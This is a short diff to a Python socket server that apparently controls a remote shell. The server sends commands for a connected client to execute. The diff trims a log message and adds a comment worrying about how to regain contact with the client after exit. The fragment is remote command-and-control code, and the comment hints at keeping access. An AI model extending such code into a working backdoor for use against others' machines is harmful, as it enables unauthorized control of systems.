@@ -18,7 +18,7 @@ server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.bind(ADDRESS)
 server_socket.listen(BACKLOG)
 
-print("Server now listening at address %s on port %s" % (ADDRESS[0], ADDRESS[1]))
+print("Server now listening at on port %s" % (ADDRESS[1]))
 
 # Accept a connection
 connection_socket, client_addr = server_socket.accept()
@@ -40,6 +40,7 @@ while True:
         # Tell the client to shut down, end server program
         encrypted_exit = command.encode()
         connection_socket.send(encrypted_exit)
+        # TODO should I really end the server program? how to get back in touch, then?
         break
     # Execute the command on the remote machine (client)
     encrypted_command = command.encode()
